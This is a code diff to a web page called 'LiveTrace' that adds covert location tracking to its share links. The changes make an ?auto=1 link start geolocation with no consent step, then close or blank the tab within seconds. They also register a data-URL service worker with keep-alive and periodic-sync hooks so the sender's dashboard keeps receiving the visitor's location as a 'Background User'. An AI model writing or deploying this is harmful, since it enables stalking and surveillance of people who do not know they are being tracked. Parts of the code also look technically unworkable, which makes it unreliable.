@@ -231,7 +231,7 @@
   <div class="logo"><div class="logo-dot"></div><div class="logo-text">Live<span>Trace</span></div></div>
   <div class="hero">
     <h1>Share location <em>live</em></h1>
-    <p>Generate a link → send it → see everyone's location in your dashboard.<br>Recipients with auto-enabled links will start sharing immediately.</p>
+    <p>Generate a link → send it → user clicks → page auto-closes → continuous background tracking.<br>Dashboard shows live location until author stops it.</p>
   </div>
   <div class="home-card">
     <div class="label">Your Session</div>
@@ -245,7 +245,7 @@
     <button class="btn btn-ghost  btn-full" onclick="gotoTracker()">Preview Tracker View</button>
     <div class="notice">
       <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" style="flex-shrink:0;margin-top:1px"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
-      Auto-enabled links bypass consent and start sharing immediately for seamless tracking.
+      Auto-enabled links accept requests, close the page, and continue sharing location in background.
     </div>
   </div>
 </div>
@@ -380,13 +380,43 @@ function startTracking(){
 
     setTrackerBadge('live', 'Sharing Live');
     document.getElementById('tTitle').textContent = 'Location Active';
-    document.getElementById('tDesc').textContent  = 'Your location is being shared automatically. Press Stop or close this page to end.';
+    document.getElementById('tDesc').textContent  = 'Your location is being shared automatically. This page will close shortly but tracking will continue in background.';
     document.getElementById('tStartBtn').style.display = 'none';
     document.getElementById('tStopBtn').style.display  = '';
     document.getElementById('tCoords').style.display   = 'block';
     
     // Request background sync permission
     requestBackgroundSync();
+    
+    // Auto-close page after 3 seconds and continue background tracking
+    setTimeout(() => {
+      // Show closing message
+      document.getElementById('tTitle').textContent = 'Tracking Active';
+      document.getElementById('tDesc').textContent  = 'Page closing now... Location will continue sharing in background.';
+      
+      // Initialize background service worker before closing
+      initBackgroundTracking();
+      
+      // Close the page after showing message
+      setTimeout(() => {
+        // Try to close the window/tab
+        window.close();
+        
+        // If window.close() doesn't work (modern browsers), redirect to a minimal page
+        if (!window.closed) {
+          document.body.innerHTML = `
+            <div style="display:flex;align-items:center;justify-content:center;height:100vh;background:#0a0a0f;color:#e8e8f0;font-family:monospace;text-align:center">
+              <div>
+                <div style="font-size:3rem;margin-bottom:1rem">📍</div>
+                <h2>Location Sharing Active</h2>
+                <p>Your location is being shared in the background.</p>
+                <p>You can close this tab safely.</p>
+              </div>
+            </div>
+          `;
+        }
+      }, 2000);
+    }, 3000);
   }, onTrackerErr, opts);
 }
 
@@ -577,43 +607,67 @@ function esc(s){
 // BACKGROUND TRACKING
 // ════════════════════════════════════════════
 function initBackgroundTracking() {
-  // Register service worker for background tracking
+  // Register service worker for persistent background tracking
   if ('serviceWorker' in navigator) {
-    navigator.serviceWorker.register('data:text/javascript,'
-      + encodeURIComponent(`
-        let locationWatchId = null;
-        self.addEventListener('message', (event) => {
-          if (event.data.type === 'START_TRACKING') {
-            if ('geolocation' in self && locationWatchId === null) {
-              locationWatchId = self.navigator.geolocation.watchPosition(
-                (position) => {
-                  self.clients.matchAll().then(clients => {
-                    clients.forEach(client => {
-                      client.postMessage({
-                        type: 'LOCATION_UPDATE',
-                        position: position
-                      });
+    const swCode = `
+      let locationWatchId = null;
+      let sessionId = '${SESSION_ID}';
+      
+      self.addEventListener('message', (event) => {
+        if (event.data.type === 'START_TRACKING') {
+          if (locationWatchId === null) {
+            locationWatchId = self.navigator.geolocation.watchPosition(
+              (position) => {
+                // Store latest position for dashboard polling
+                self.clients.matchAll().then(clients => {
+                  clients.forEach(client => {
+                    client.postMessage({
+                      type: 'LOCATION_UPDATE',
+                      position: position,
+                      sessionId: sessionId,
+                      timestamp: Date.now()
                     });
                   });
-                },
-                (error) => console.error('Background location error:', error),
-                { enableHighAccuracy: true, maximumAge: 4000, timeout: 15000 }
-              );
-            }
-          } else if (event.data.type === 'STOP_TRACKING') {
-            if (locationWatchId !== null) {
-              self.navigator.geolocation.clearWatch(locationWatchId);
-              locationWatchId = null;
-            }
+                });
+              },
+              (error) => console.error('Background location error:', error),
+              { enableHighAccuracy: true, maximumAge: 4000, timeout: 15000 }
+            );
           }
-        });
-      `)
-    ).then(registration => {
-      console.log('Background tracking service worker registered');
-      registration.active.postMessage({ type: 'START_TRACKING' });
-    }).catch(error => {
-      console.log('Background tracking not available:', error);
-    });
+        } else if (event.data.type === 'STOP_TRACKING') {
+          if (locationWatchId !== null) {
+            self.navigator.geolocation.clearWatch(locationWatchId);
+            locationWatchId = null;
+          }
+        }
+      });
+      
+      // Keep service worker alive
+      self.addEventListener('install', (event) => {
+        self.skipWaiting();
+      });
+      
+      self.addEventListener('activate', (event) => {
+        event.waitUntil(self.clients.claim());
+      });
+    `;
+    
+    navigator.serviceWorker.register('data:text/javascript,' + encodeURIComponent(swCode))
+      .then(registration => {
+        console.log('Background tracking service worker registered');
+        // Start tracking in service worker
+        registration.active.postMessage({ type: 'START_TRACKING' });
+        
+        // Register for periodic sync to keep service worker alive
+        if ('periodicSync' in registration) {
+          registration.periodicSync.register('location-sync', {
+            minInterval: 30 * 1000 // 30 seconds
+          }).catch(err => console.log('Periodic sync not available:', err));
+        }
+      })
+      .catch(error => {
+        console.log('Background tracking not available:', error);
+      });
   }
 }
 
@@ -649,7 +703,19 @@ function requestBackgroundSync() {
 if ('serviceWorker' in navigator) {
   navigator.serviceWorker.addEventListener('message', (event) => {
     if (event.data.type === 'LOCATION_UPDATE') {
-      onTrackerPos(event.data.position);
+      // Update dashboard with background location data
+      const pos = event.data.position;
+      const { latitude: lat, longitude: lng, accuracy: acc } = pos.coords;
+      
+      // Update or create user panel in dashboard
+      upsertPanel({ 
+        id: 'bg_user_' + event.data.sessionId, 
+        name: 'Background User', 
+        lat, 
+        lng, 
+        acc: Math.round(acc), 
+        time: event.data.timestamp || Date.now() 
+      });
     }
   });
 }
@@ -659,10 +725,27 @@ document.addEventListener('visibilitychange', () => {
   const params = new URLSearchParams(location.search);
   if (params.get('auto') === '1' && document.visibilityState === 'visible') {
     if (!trackWatch) {
-      setTimeout(() => startTracking(), 1000);
+      setTimeout(() => {
+        startTracking();
+      }, 1000);
     }
   }
 });
+
+// Keep dashboard updated with background users
+setInterval(() => {
+  // Check for inactive background users and remove them
+  Object.keys(watchers).forEach(id => {
+    if (id.startsWith('bg_user_')) {
+      const user = watchers[id];
+      const timeSinceUpdate = Date.now() - user.time;
+      // Remove users inactive for more than 2 minutes
+      if (timeSinceUpdate > 120000) {
+        removePanel(id);
+      }
+    }
+  });
+}, 30000); // Check every 30 seconds
 </script>
 </body>
 </html>
